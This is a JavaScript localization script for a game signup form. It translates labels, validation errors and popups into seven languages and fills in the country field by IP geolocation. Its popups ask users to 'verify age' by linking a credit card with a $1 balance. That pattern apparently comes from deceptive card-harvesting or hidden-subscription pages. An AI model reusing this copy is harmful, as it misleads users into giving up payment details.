(function(window){
	var language = function(str) {
		var localize = navigator.language || navigator.userLanguage;
        var def = 'en';
		if(typeof localize == 'undefined') {
			localize = def;
		}
		else {
			var local = localize.split('-');
			localize = local[0];
		}
		var store = {
			
			'en': {
				'play_now': 'PLAY NOW',
                'email': 'Email',
                'password': 'Password',
                'first_name': 'First Name',
                'last_name': 'Last Name',
                'zip_postal_code': 'Zip/Postal Code',
                'country': 'Сountry',
                'state': 'State',
                'province': 'Province',
                'popup_title2': 'Attention!',
                'popup_text2': 'After signing up you\'ll need to confirm your age with a credit card. Make sure that you have $1 on your balance for pre-authorization. Once it is done your funds will be returned back to you.',
                'popup_title1': 'Dear user!',
                'popup_text1': 'You are required to confirm that you are older than 18 by assigning your credit card with a balance of at least $1. The funds will be returned back to you upon successful verification.',
                'popup_title3': 'Congrats!',
                'popup_text3': 'Registration completed successfully! In the next step, you\'ll need to confirm your age with credit card. Please do not use cards with an empty balance because they will be automatically rejected.',
                'popup_confirm_title': 'Are you sure?',
                'popup_confirm_text': 'If you cancel the action - you will not be able to play the game.',
                'popup_confirm': 'Ok',
                'popup_cancel': 'Cancel',
                'popup_yes': 'Yes',
                'popup_no': 'No',
				'vadidation_title': 'Validation error',
                'validation_text': 'An error was made when filling out the fields',
                'validation_question': 'Do you agree to eliminate it?',
                'validation_yes': 'Yes',
                'validation_no': 'No',
                'validation_email': 'Invalid Email',
                'validation_password': 'Empty Password',
                'validation_password_length': 'Password needs to be at least 6 characters',
                'validation_password_symbol': 'Special characters (;&?) are not allowed in the password',
                'validation_firstname': 'Empty FirstName',
                'validation_lastname': 'Empty LastName',
                'validation_zip': 'Empty Zip or Postal Code',
                'validation_country': 'Empty Country',
                'translate_email': 'E-mail Address is not valid',
                'translate_password': 'Password needs to be between 6 to 20 characters.',
                'translate_firstname': 'Please enter a valid first name.',
                'translate_lastname': 'Please enter a valid last name.',
				// 'validation_firstname_latin': 'Only Latin characters and symbols . and - are allowed for the first name',
				// 'validation_lastname_latin': 'Only Latin characters and symbols . and - are allowed for the last names'
                'validation_firstname_latin': 'Please, use only latin symbols',
				'validation_lastname_latin': 'Please, use only latin symbols'
			},
            //es
			'es': {
				'play_now': 'REPRODUCIR AHORA',
                'email': 'Email',
                'password': 'Contraseña',
                'first_name': 'Primer nombre',
                'last_name': 'Apellido',
                'zip_postal_code': 'Código postal',
                'country': 'País',
                'state': 'Expresar',
                'province': 'Provincia',
                'popup_title2': '¡Atención!',
                'popup_text2': 'Después de registrarse, deberá confirmar su edad con una tarjeta de crédito. Asegúrese de tener $1 en su saldo para la autorización previa. Una vez hecho esto, sus fondos le serán devueltos.',
                'popup_title1': '¡Estimado usuario!',
                'popup_text1': 'Debe confirmar que es mayor de 18 años asignando su tarjeta de crédito con un saldo de al menos $ 1. Los fondos le serán devueltos después de una verificación exitosa.',
                'popup_title3': '¡Felicidades!',
                'popup_text3': '¡El registro se completó con éxito! En el siguiente paso, deberá confirmar su edad con tarjeta de crédito. Por favor, no utilice tarjetas con saldo vacío porque serán rechazadas automáticamente.',
                'popup_confirm_title': '¿Estás seguro?',
                'popup_confirm_text': 'Si cancelas la acción, no podrás jugar el juego.',
                'popup_confirm': 'Ok',
                'popup_cancel': 'Cancelar',
                'popup_yes': 'Sí',
                'popup_no': 'No',
				'vadidation_title': 'Error de validación',
                'validation_text': 'Se ha producido un error al llenar los campos',
                'validation_question': '¿Está de acuerdo en eliminarlo?',
                'validation_yes': 'Sí',
                'validation_no': 'No',
                'validation_email': 'Correo Electrónico Inválido',
                'validation_password': 'Contraseña vacía',
                'validation_password_length': 'La contraseña tiene que tener al menos 6 caracteres.',
                'validation_password_symbol': 'No se permiten caracteres especiales (;&?) en la contraseña',
                'validation_firstname': 'Nombre vacío',
                'validation_lastname': 'Apellido vacío',
                'validation_zip': 'Código postal vacío',
                'validation_country': 'País vacío',
                'translate_email': 'La dirección de email no es válida',
                'translate_password': 'La contraseña debe tener entre 6 y 20 caracteres.',
                'translate_firstname': 'Por favor, introduce un nombre válido.',
                'translate_lastname': 'Por favor, introduce un apellido válido',
				'validation_firstname_latin': 'Por favor, utilice sólo símbolos latinos',
				'validation_lastname_latin': 'Por favor, utilice sólo símbolos latinos'
			},
            //fr
            'fr': {
                'play_now': 'JOUE MAINTENANT',
                'email': 'E-mail',
                'password': 'Mot de passe',
                'first_name': 'Prénom',
                'last_name': 'Nom de famille',
                'zip_postal_code': 'Zip/code postal',
                'country': 'Pays',
                'state': 'État',
                'province': 'Province',
                'popup_title2': 'Attention !',
                'popup_text2': 'Après t\'être inscrit, tu devras confirmer ton âge à l\'aide d\'une carte de crédit. Assure-toi d\'avoir un solde d\'un euro pour la pré-autorisation. Une fois cette opération effectuée, tes fonds te seront rendus.',
                'popup_title1': 'Cher utilisateur !',
                'popup_text1': 'Nous te prions de bien vouloir confirmer que tu as plus de 18 ans en attribuant à ta carte de crédit un solde d\'au moins 1 $. Les fonds te seront rendus une fois la vérification réussie.',
                'popup_title3': 'Félicitations !',
                'popup_text3': 'L\'inscription a été effectuée avec succès ! À l\'étape suivante, tu devras confirmer ton âge avec une carte de crédit. Merci de ne pas utiliser de cartes avec un solde vide car elles seront automatiquement rejetées.',
                'popup_confirm_title': 'Vous êtes sûr ?',
                'popup_confirm_text': 'Si tu annules l\'action, tu ne pourras pas jouer le jeu.',
                'popup_confirm': 'Ok',
                'popup_cancel': 'Annuler',
                'popup_yes': 'Oui',
                'popup_no': 'Non',
				'vadidation_title': 'Erreur de validation',
                'validation_text': 'Une erreur a été commise en remplissant les champs',
                'validation_question': 'Acceptez-vous de l\'éliminer?',
                'validation_yes': 'Oui',
                'validation_no': 'Non',
                'validation_email': 'Courriel invalide',
                'validation_password': 'Mot de passe vide',
                'validation_password_length': 'Le mot de passe doit comporter au moins 6 caractères',
                'validation_password_symbol': 'Les caractères spéciaux (;& ?) ne sont pas autorisés dans le mot de passe',
                'validation_firstname': 'Prénom vide',
                'validation_lastname': 'Nom de famille vide',
                'validation_zip': 'Code postal ou zip vide',
                'validation_country': 'Pays vide',
                'translate_email': 'L\'adresse e-mail n\'est pas valide',
                'translate_password': 'Le mot de passe doit comporter entre 6 et 20 caractères.',
                'translate_firstname': 'Veuillez entrer un prénom valide.',
                'translate_lastname': 'Veuillez entrer un nom de famille valide',
				'validation_firstname_latin': 'Merci d\'utiliser uniquement des symboles latins',
				'validation_lastname_latin': 'Merci d\'utiliser uniquement des symboles latins'
            },
            //de
            'de': {
                'play_now': 'JETZT SPIELEN',
                'email': 'Email',
                'password': 'Passwort',
                'first_name': 'Vorname',
                'last_name': 'Nachname',
                'zip_postal_code': 'Postleitzahl',
                'country': 'Land',
                'state': 'Zustand',
                'province': 'Provinz',
                'popup_title2': 'Achtung!',
                'popup_text2': 'Nach der Anmeldung musst du dein Alter mit einer Kreditkarte bestätigen. Vergewissere dich, dass auf deinem Guthaben 1 $ für die Vorautorisierung verbleibt. Sobald dies geschehen ist, wird dir dein Guthaben zurückerstattet.',
                'popup_title1': 'Lieber Benutzer!',
                'popup_text1': 'Bitte bestätige, dass du älter als 18 Jahre bist, indem du deine Kreditkarte mit einem Guthaben von mindestens $1 belegst. Das Guthaben wird dir nach erfolgreicher Überprüfung zurückerstattet.',
                'popup_title3': 'Herzlichen Glückwunsch!',
                'popup_text3': 'Registrierung erfolgreich abgeschlossen! Im nächsten Schritt musst du dein Alter mit einer Kreditkarte bestätigen. Bitte verwende keine Karten mit einem leeren Guthaben, da diese automatisch abgelehnt werden.',
                'popup_confirm_title': 'Bist du dir sicher?',
                'popup_confirm_text': 'Wenn du den Vorgang abbrichst, kannst du das Spiel nicht mehr spielen.',
                'popup_confirm': 'Ok',
                'popup_cancel': 'Abbrechen',
                'popup_yes': 'Ja',
                'popup_no': 'Nein',
				'vadidation_title': 'Überprüfungsfehler',
                'validation_text': 'Beim Ausfüllen der Felder ist ein Fehler aufgetreten',
                'validation_question': 'Sind Sie damit einverstanden, ihn zu beseitigen?',
                'validation_yes': 'Ja',
                'validation_no': 'Nein',
                'validation_email': 'Ungültige E-Mail',
                'validation_password': 'Leeres Passwort',
                'validation_password_length': 'Das Passwort muss mindestens 6 Zeichen lang sein',
                'validation_password_symbol': 'Sonderzeichen (;&?) sind im Passwort nicht erlaubt',
                'validation_firstname': 'Leerer Vorname',
                'validation_lastname': 'Leerer Nachname',
                'validation_zip': 'Postleitzahl leer',
                'validation_country': 'Land leer',
                'translate_email': 'Diese E-Mail-Adresse ist nicht gültig',
                'translate_password': 'Das Passwort muss zwischen 6 und 20 Zeichen lang sein.',
                'translate_firstname': 'Bitte geben Sie einen gültigen Vornamen ein.',
                'translate_lastname': 'Bitte geben Sie einen gültigen Nachnamen ein',
				'validation_firstname_latin': 'Bitte verwenden Sie nur lateinische Zeichen',
				'validation_lastname_latin': 'Bitte verwenden Sie nur lateinische Zeichen'
            },
            //it
            'it': {
                'play_now': 'RIPRODUCI ORA',
                'email': 'E-mail',
                'password': 'Parola d\'ordine',
                'first_name': 'Nome di battesimo',
                'last_name': 'Cognome',
                'zip_postal_code': 'Zip/Codice postale',
                'country': 'Paese',
                'state': 'Stato',
                'province': 'Provincia',
                'popup_title2': 'Attenzione!',
                'popup_text2': 'Una volta iscritto dovrai confermare la tua età mediante carta di credito. Assicurati di avere 1 dollaro sul saldo per la pre-autorizzazione. Una volta effettuata, i soldi ti verranno rimborsati.',
                'popup_title1': 'Caro Utente!',
                'popup_text1': 'Devi confermare di avere più di 18 anni assegnando la tua carta di credito che abbia un saldo di almeno $1. I fondi ti saranno rimborsati una volta che la verifica sarà andata a buon fine.',
                'popup_title3': 'Congratulazioni!',
                'popup_text3': 'La registrazione è stata completata con successo! Nella fase successiva, dovrai confermare la tua età con una carta di credito. Ti invitiamo a non utilizzare carte vuote perché verranno automaticamente rifiutate.',
                'popup_confirm_title': 'Sei sicuro?',
                'popup_confirm_text': 'Se annulli l\'azione, non potrai giocare.',
                'popup_confirm': 'Ok',
                'popup_cancel': 'Annulla',
                'popup_yes': 'Sì',
                'popup_no': 'No',
				'vadidation_title': 'Errore di convalida',
                'validation_text': 'C\'è stato un errore nella compilazione dei campi',
                'validation_question': 'Sei d\'accordo a eliminarlo?',
                'validation_yes': 'Sì',
                'validation_no': 'No',
                'validation_email': 'Email Invalida',
                'validation_password': 'Password Vuota',
                'validation_password_length': 'La password deve contenere almeno 6 caratteri',
                'validation_password_symbol': 'I caratteri speciali (;&?) non sono ammessi nella password.',
                'validation_firstname': 'Nome Vuoto',
                'validation_lastname': 'Cognome vuoto',
                'validation_zip': 'CAP Vuoto',
                'validation_country': 'Paese vuoto',
                'translate_email': 'Indirizzo email non valido',
                'translate_password': 'La Password deve essere tra 6 e 20 caratteri',
                'translate_firstname': 'Per favore inserire un nome valido.',
                'translate_lastname': 'Per favore inserisci un cognome valido.',
				'validation_firstname_latin': 'Usa solo simboli latini',
				'validation_lastname_latin': 'Usa solo simboli latini'
            },
            //ru
            'ru': {
                'play_now': 'ИГРАТЬ СЕЙЧАС',
                'email': 'Почта',
                'password': 'Пароль',
                'first_name': 'Имя',
                'last_name': 'Фамилия',
                'zip_postal_code': 'Почтовый индекс',
                'country': 'Страна',
                'state': 'Область',
                'province': 'Регион',
                'popup_title2': 'Внимание!',
                'popup_text2': 'После регистрации вам нужно будет подтвердить свой возраст с помощью кредитной карты. Убедитесь, что на вашем балансе есть $1 для предварительной авторизации. Как только авторизация будет пройдена, ваши средства будут возвращены вам.',
                'popup_title1': 'Уважаемый пользователь!',
                'popup_text1': 'Вы должны подтвердить, что вам больше 18 лет, указав свою кредитную карту с балансом не менее 1 доллара США. Средства будут возвращены вам после успешной проверки.',
                'popup_title3': 'Поздравляем!',
                'popup_text3': 'Регистрация успешно завершена! На следующем этапе вам нужно будет подтвердить свой возраст с помощью кредитной карты. Пожалуйста, не используйте карты с пустым балансом, так как они будут автоматически отклонены.',
                'popup_confirm_title': 'Вы уверены?',
                'popup_confirm_text': 'Если вы отмените действие - вы не сможете играть в игру.',
                'popup_confirm': 'Ок',
                'popup_cancel': 'Отмена',
                'popup_yes': 'Да',
                'popup_no': 'Нет',
				'vadidation_title': 'Ошибка проверки',
                'validation_text': 'Произошла ошибка при заполнении полей',
                'validation_question': 'Вы согласны устранить это?',
                'validation_yes': 'Да',
                'validation_no': 'Нет',
                'validation_email': 'Неверный адрес Электронной почты',
                'validation_password': 'Пустое поле Пароля',
                'validation_password_length': 'Пароль должен содержать не менее 6 символов',
                'validation_password_symbol': 'Cпециальные символы (;&?) в пароле не разрешены',
                'validation_firstname': 'Пустое поле Имя',
                'validation_lastname': 'Пустое поле Фамилия',
                'validation_zip': 'Пустое поле Почтовый индекс',
                'validation_country': 'Пустое поле Страна',
                'translate_email': 'Неверный адрес электронной почты',
                'translate_password': 'Пароль должен содержать от 6 до 20 символов.',
                'translate_firstname': 'Пожалуйста, введите корректное Имя.',
                'translate_lastname': 'Пожалуйста, введите действительную Фамилию',
                'validation_firstname_latin': 'Только латинские буквы и символы разрешены для имени',
                'validation_lastname_latin': 'Только латинские буквы и символы разрешены для фамилии'
			},
            //tr
            'tr': {
				'play_now': 'ŞİMDİ OYNA',
                'email': 'E-posta',
                'password': 'Şifre',
                'first_name': 'İlk İsim',
                'last_name': 'Soyadı',
                'zip_postal_code': 'Posta Kodu/Postal Code',
                'country': 'Сountry',
                'state': 'Durum',
                'province': 'İl',
                'popup_title2': 'Dikkat!',
                'popup_text2': 'Kaydolduktan sonra yaşınızı bir kredi kartı ile onaylamanız gerekecektir. Ön provizyon için bakiyenizde 1$ olduğundan emin olun. Bu işlem tamamlandıktan sonra paranız size geri iade edilecektir',
                'popup_title1': 'Sayın kullanıcı!',
                'popup_text1': 'Kredi kartınızda en az 1 $ bakiye tutarak 18 yaşından büyük olduğunuzu onaylamanız gerekmektedir. Başarılı bir doğrulama sonrasında paranız size iade edilecektir',
                'popup_title3': 'Tebrikler!',
                'popup_text3': 'Kayıt başarıyla tamamlandı! Bir sonraki adımda yaşınızı kredi kartı ile onaylamanız gerekecek. Lütfen boş bakiyesi olan kartları kullanmayın çünkü bunlar otomatik olarak reddedilecektir',
                'popup_confirm_title': 'Emin misiniz?',
                'popup_confirm_text': 'İşlemi iptal ederseniz - oyunu oynayamazsınız',
                'popup_confirm': 'Tamam',
                'popup_cancel': 'İptal',
                'popup_yes': 'Evet',
                'popup_no': 'Hayır',
                'vadidation_title': 'Doğrulama hatası',
                'validation_text': 'Alanlar doldurulurken bir hata yapıldı',
                'validation_question': "Bunu kaldırmayı kabul ediyor musunuz?",
                'validation_yes': 'Evet',
                'validation_no': 'Hayır',
                'validation_email': 'Geçersiz E-posta',
                'validation_password': 'Boş Şifre',
                'validation_password_length': 'Parolanın en az 6 karakter olması gerekir',
                'validation_password_symbol': 'Parolada özel karakterlere (;&?) izin verilmez',
                'validation_firstname': 'Boş FirstName',
                'validation_lastname': 'Boş LastName',
                'validation_zip': 'Boş Posta Kodu veya Posta Kodu',
                'validation_country': 'Boş Ülke',
                'translate_email': 'E-posta Adresi geçerli değil',
                'translate_password': 'Parola 6 ila 20 karakter arasında olmalıdır.',
                'translate_firstname': 'Lütfen geçerli bir ad girin',
                'translate_lastname': 'Lütfen geçerli bir soyadı girin',
                'validation_firstname_latin': 'Lütfen sadece latin sembolleri kullanın',
                'validation_lastname_latin': 'Lütfen yalnızca latin sembolleri kullanın'

			},
		
		}	
		if(typeof store[localize] == 'undefined') {
            localize = def;
        }
        
		return store[localize][str];
      
	}
    document.querySelectorAll('[data-lang]').forEach(function (e) {
        if(typeof e.value == 'string') {
            if(e.value.length > 0) {
                e.value = language(e.dataset.lang);
            }
            else {
                e.placeholder = language(e.dataset.lang);
            }
        }
        else if(typeof e.innerHTML == 'string') {
            e.innerHTML = language(e.dataset.lang)+':';
        }
            
    });
    const country = document.getElementsByName("country")[0];
    const e = new Event("change");
    if(localStorage.getItem('alfa2') == null) {
        $.ajax({
        url: "https://ipapi.co/json/",
        type: 'GET',
        success: function(json) {
            country.value = json.country;
            country.dispatchEvent(e);
        },
        error: function(err) {
            console.log("Request failed, error= " + err);
        }
        });
    }
    else {
        country.value = localStorage.getItem('alfa2');
        country.dispatchEvent(e);
    }
    country.addEventListener('change', (event) => {
        if( typeof document.querySelectorAll('[data-lang="state"]')[0] != 'undefined') {
            document.querySelectorAll('[data-lang="state"]')[0].innerHTML = language('state');
        }
        if( typeof document.querySelectorAll('[data-lang="province"]')[0] != 'undefined') {
            document.querySelectorAll('[data-lang="province"]')[0].innerHTML = language('province');
        }
    });
    window.language = language;
})(window);
